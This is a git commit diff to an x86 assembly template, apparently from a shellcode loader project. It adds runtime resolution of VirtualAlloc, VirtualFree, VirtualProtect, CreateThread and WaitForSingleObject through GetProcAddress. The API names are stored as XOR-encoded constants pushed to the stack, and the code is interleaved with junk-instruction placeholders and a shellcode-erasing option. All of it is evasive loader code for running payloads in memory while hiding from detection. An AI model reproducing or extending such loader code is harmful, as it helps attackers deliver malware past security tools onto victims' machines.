e6478dbaeba3c7b33e69975d8b6758a65b76bd42
For-ACGN <38399410+For-ACGN@users.noreply.github.com>
2025-08-16 14:57:36 +0800

    loader_x86.asm: finish code about get procedure address.

--- loader/loader_x86.asm
+++ loader/loader_x86.asm
@@ -72,8 +72,8 @@ entry:
   mov {{.RegN.ebx}}, [{{.RegN.ebx}}]                           {{igi}}
 
   // load kernel32.dll
-  push esp             {{igi}} // lpLibFileName
-  call {{.RegN.ebx}}   {{igi}} // call LoadLibraryA/W
+  push esp                 {{igi}} // lpLibFileName
+  call {{.RegN.ebx}}       {{igi}} // call LoadLibraryA/W
 
   // store the handle of kernel32.dll
   mov {{.RegN.esi}}, eax                                       {{igi}}
@@ -85,8 +85,181 @@ entry:
     add esp, 4*4                                               {{igi}}
   {{end}}
 
+  // read the GetProcAddress form IAT
+  mov {{.RegV.eax}}, {{.RegN.edi}}                             {{igi}}
+  add {{.RegV.eax}}, {{hex .GetProcAddress}}                   {{igi}}
+  mov {{.RegN.ebp}}, [{{.RegV.eax}}]                           {{igi}}
 
+  // get procedure address of VirtualAlloc
+  {{if .LackVirtualAlloc}}
+    // push procedure name to stack
+    mov {{.RegV.eax}}, {{index .VirtualAllocDB  0}}            {{igi}}
+    mov {{.RegV.ecx}}, {{index .VirtualAllocKey 0}}            {{igi}}
+    xor {{.RegV.eax}}, {{.RegV.ecx}}                           {{igi}}
+    push {{.RegV.eax}}                                         {{igi}}
+    mov {{.RegV.ecx}}, {{index .VirtualAllocDB  1}}            {{igi}}
+    mov {{.RegV.edx}}, {{index .VirtualAllocKey 1}}            {{igi}}
+    xor {{.RegV.ecx}}, {{.RegV.edx}}                           {{igi}}
+    push {{.RegV.ecx}}                                         {{igi}}
+    mov {{.RegV.eax}}, {{index .VirtualAllocDB  2}}            {{igi}}
+    mov {{.RegV.ecx}}, {{index .VirtualAllocKey 2}}            {{igi}}
+    xor {{.RegV.eax}}, {{.RegV.ecx}}                           {{igi}}
+    push {{.RegV.eax}}                                         {{igi}}
+    mov {{.RegV.ecx}}, {{index .VirtualAllocDB  3}}            {{igi}}
+    mov {{.RegV.edx}}, {{index .VirtualAllocKey 3}}            {{igi}}
+    xor {{.RegV.ecx}}, {{.RegV.edx}}                           {{igi}}
+    push {{.RegV.ecx}}                                         {{igi}}
+    push esp               {{igi}} // lpProcName
+    push {{.RegN.esi}}     {{igi}} // hModule
+    call {{.RegN.ebp}}     {{igi}} // call GetProcAddress
+    // restore stack for procedure name
+    add esp, 4*4                                               {{igi}}
+    // store procedure address to stack
+    mov [esp+0x08], eax                                        {{igi}}
+  {{else}}
+    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{igi}}
+    add {{.RegV.ecx}}, {{hex .VirtualAlloc}}                   {{igi}}
+    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{igi}}
+    mov [esp+0x08], {{.RegV.ecx}}                              {{igi}}
+  {{end}}
 
+  // get procedure address of VirtualFree
+  {{if .NeedEraseShellcode}}
+    {{if .LackVirtualFree}}
+      // push procedure name to stack
+      mov {{.RegV.ecx}}, {{index .VirtualFreeDB  0}}           {{igi}}
+      mov {{.RegV.eax}}, {{index .VirtualFreeKey 0}}           {{igi}}
+      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{igi}}
+      push {{.RegV.ecx}}                                       {{igi}}
+      mov {{.RegV.edx}}, {{index .VirtualFreeDB  1}}           {{igi}}
+      mov {{.RegV.ecx}}, {{index .VirtualFreeKey 1}}           {{igi}}
+      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
+      push {{.RegV.edx}}                                       {{igi}}
+      mov {{.RegV.eax}}, {{index .VirtualFreeDB  2}}           {{igi}}
+      mov {{.RegV.edx}}, {{index .VirtualFreeKey 2}}           {{igi}}
+      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{igi}}
+      push {{.RegV.eax}}                                       {{igi}}
+      push esp             {{igi}} // lpProcName
+      push {{.RegN.esi}}   {{igi}} // hModule
+      call {{.RegN.ebp}}   {{igi}} // call GetProcAddress
+      // restore stack for procedure name
+      add esp, 3*4                                             {{igi}}
+      // store procedure address to stack
+      mov [esp+0x0C], eax                                      {{igi}}
+    {{else}}
+      mov {{.RegV.ecx}}, {{.RegN.edi}}                         {{igi}}
+      add {{.RegV.ecx}}, {{hex .VirtualFree}}                  {{igi}}
+      mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                       {{igi}}
+      mov [esp+0x0C], {{.RegV.ecx}}                            {{igi}}
+    {{end}}
+  {{end}}
+
+  // get procedure address of VirtualProtect
+  {{if .LackVirtualProtect}}
+    // push procedure name to stack
+    mov {{.RegV.ecx}}, {{index .VirtualProtectDB  0}}          {{igi}}
+    mov {{.RegV.eax}}, {{index .VirtualProtectKey 0}}          {{igi}}
+    xor {{.RegV.ecx}}, {{.RegV.eax}}                           {{igi}}
+    push {{.RegV.ecx}}                                         {{igi}}
+    mov {{.RegV.edx}}, {{index .VirtualProtectDB  1}}          {{igi}}
+    mov {{.RegV.ecx}}, {{index .VirtualProtectKey 1}}          {{igi}}
+    xor {{.RegV.edx}}, {{.RegV.ecx}}                           {{igi}}
+    push {{.RegV.edx}}                                         {{igi}}
+    mov {{.RegV.eax}}, {{index .VirtualProtectDB  2}}          {{igi}}
+    mov {{.RegV.edx}}, {{index .VirtualProtectKey 2}}          {{igi}}
+    xor {{.RegV.eax}}, {{.RegV.edx}}                           {{igi}}
+    push {{.RegV.eax}}                                         {{igi}}
+    mov {{.RegV.edx}}, {{index .VirtualProtectDB  3}}          {{igi}}
+    mov {{.RegV.ecx}}, {{index .VirtualProtectKey 3}}          {{igi}}
+    xor {{.RegV.edx}}, {{.RegV.ecx}}                           {{igi}}
+    push {{.RegV.edx}}                                         {{igi}}
+    push esp               {{igi}} // lpProcName
+    push {{.RegN.esi}}     {{igi}} // hModule
+    call {{.RegN.ebp}}     {{igi}} // call GetProcAddress
+    // restore stack for procedure name
+    add esp, 4*4                                               {{igi}}
+    // store procedure address to stack
+    mov [esp+0x10], eax                                        {{igi}}
+  {{else}}
+    mov {{.RegV.edx}}, {{.RegN.edi}}                           {{igi}}
+    add {{.RegV.edx}}, {{hex .VirtualProtect}}                 {{igi}}
+    mov {{.RegV.edx}}, [{{.RegV.edx}}]                         {{igi}}
+    mov [esp+0x10], {{.RegV.edx}}                              {{igi}}
+  {{end}}
+
+  // get procedure address of CreateThread
+  {{if .NeedCreateThread}}
+    {{if .LackCreateThread}}
+      // push procedure name to stack
+      mov {{.RegV.ecx}}, {{index .CreateThreadDB  0}}          {{igi}}
+      mov {{.RegV.eax}}, {{index .CreateThreadKey 0}}          {{igi}}
+      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{igi}}
+      push {{.RegV.ecx}}                                       {{igi}}
+      mov {{.RegV.edx}}, {{index .CreateThreadDB  1}}          {{igi}}
+      mov {{.RegV.ecx}}, {{index .CreateThreadKey 1}}          {{igi}}
+      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
+      push {{.RegV.edx}}                                       {{igi}}
+      mov {{.RegV.eax}}, {{index .CreateThreadDB  2}}          {{igi}}
+      mov {{.RegV.edx}}, {{index .CreateThreadKey 2}}          {{igi}}
+      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{igi}}
+      push {{.RegV.eax}}                                       {{igi}}
+      mov {{.RegV.edx}}, {{index .CreateThreadDB  3}}          {{igi}}
+      mov {{.RegV.ecx}}, {{index .CreateThreadKey 3}}          {{igi}}
+      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
+      push {{.RegV.edx}}                                       {{igi}}
+      push esp             {{igi}} // lpProcName
+      push {{.RegN.esi}}   {{igi}} // hModule
+      call {{.RegN.ebp}}   {{igi}} // call GetProcAddress
+      // restore stack for procedure name
+      add esp, 4*4                                             {{igi}}
+      // store procedure address to stack
+      mov [esp+0x14], eax                                      {{igi}}
+    {{else}}
+      mov {{.RegV.eax}}, {{.RegN.edi}}                         {{igi}}
+      add {{.RegV.eax}}, {{hex .CreateThread}}                 {{igi}}
+      mov {{.RegV.eax}}, [{{.RegV.eax}}]                       {{igi}}
+      mov [esp+0x14], {{.RegV.eax}}                            {{igi}}
+    {{end}}
+  {{end}}
+
+  // get procedure address of WaitForSingleObject
+  {{if .NeedWaitThread}}
+    {{if .LackWaitForSingleObject}}
+      // push procedure name to stack
+      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectDB  0}}   {{igi}}
+      mov {{.RegV.eax}}, {{index .WaitForSingleObjectKey 0}}   {{igi}}
+      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{igi}}
+      push {{.RegV.ecx}}                                       {{igi}}
+      mov {{.RegV.edx}}, {{index .WaitForSingleObjectDB  1}}   {{igi}}
+      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectKey 1}}   {{igi}}
+      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
+      push {{.RegV.edx}}                                       {{igi}}
+      mov {{.RegV.eax}}, {{index .WaitForSingleObjectDB  2}}   {{igi}}
+      mov {{.RegV.edx}}, {{index .WaitForSingleObjectKey 2}}   {{igi}}
+      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{igi}}
+      push {{.RegV.eax}}                                       {{igi}}
+      mov {{.RegV.edx}}, {{index .WaitForSingleObjectDB  3}}   {{igi}}
+      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectKey 3}}   {{igi}}
+      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
+      push {{.RegV.edx}}                                       {{igi}}
+      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectDB  4}}   {{igi}}
+      mov {{.RegV.eax}}, {{index .WaitForSingleObjectKey 4}}   {{igi}}
+      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{igi}}
+      push {{.RegV.ecx}}                                       {{igi}}
+      push esp             {{igi}} // lpProcName
+      push {{.RegN.esi}}   {{igi}} // hModule
+      call {{.RegN.ebp}}   {{igi}} // call GetProcAddress
+      // restore stack for procedure name
+      add esp, 5*4                                             {{igi}}
+      // store procedure address to stack
+      mov [esp+0x18], eax                                      {{igi}}
+    {{else}}
+      mov {{.RegV.ecx}}, {{.RegN.edi}}                         {{igi}}
+      add {{.RegV.ecx}}, {{hex .WaitForSingleObject}}          {{igi}}
+      mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                       {{igi}}
+      mov [esp+0x18], {{.RegV.ecx}}                            {{igi}}
+    {{end}}
+  {{end}}
 
 {{else}}
   // get pointer to the PEB
